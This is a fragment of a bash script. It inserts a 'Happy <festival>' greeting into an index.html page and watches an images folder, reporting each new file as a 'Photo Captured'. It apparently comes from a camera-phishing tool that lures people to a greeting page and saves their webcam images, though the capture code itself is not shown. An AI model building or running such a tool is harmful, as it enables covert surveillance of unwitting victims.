...
sed -i "s|⭐ Happy .* ⭐|⭐ Happy $(echo "$fest" | sed 's/[&/\]/\\&/g') ⭐|g" index.html
...
last_file=""
while true; do
    new_file=$(inotifywait -e create --format '%f' images 2>/dev/null)
    if [[ "$new_file" != "$last_file" ]]; then
        echo -e "${green}[+] Photo Captured:${reset} images/$new_file"
        last_file="$new_file"
    fi
done
